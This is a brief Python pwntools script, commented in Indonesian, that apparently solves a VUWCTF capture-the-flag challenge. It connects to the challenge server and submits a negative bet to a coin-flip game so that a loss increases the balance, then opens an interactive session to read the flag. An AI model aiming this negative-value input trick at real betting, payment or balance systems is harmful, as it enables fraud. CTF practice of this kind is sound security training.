#!/usr/bin/env python3
from pwn import *

def solve():
    # Setup koneksi ke server VUWCTF
    host = "chals.vuwctf.com"
    port = 9999
    
    log.info(f"Connecting to {host}:{port}...")
    r = remote(host, port)

    # Tunggu sampai prompt meminta jumlah taruhan
    r.recvuntil(b"How much would you like to bet?")
    
    # Inject logic bug: Taruhan dengan nilai negatif yang sangat besar
    # Tujuannya adalah untuk "kalah" agar saldo kita malah bertambah
    bet_amount = b"-100000"
    log.info(f"Sending negative bet: {bet_amount.decode()}")
    r.sendline(bet_amount)

    # Tunggu prompt pemilihan sisi koin
    r.recvuntil(b"Heads (1) or Tails (2)?")
    
    # Pilih 1 (Heads) secara asal
    log.info("Choosing 1 (Heads)...")
    r.sendline(b"1")

    # Masuk ke mode interaktif untuk melihat output terminal dan mengambil flag
    r.interactive()

if __name__ == "__main__":
    solve()
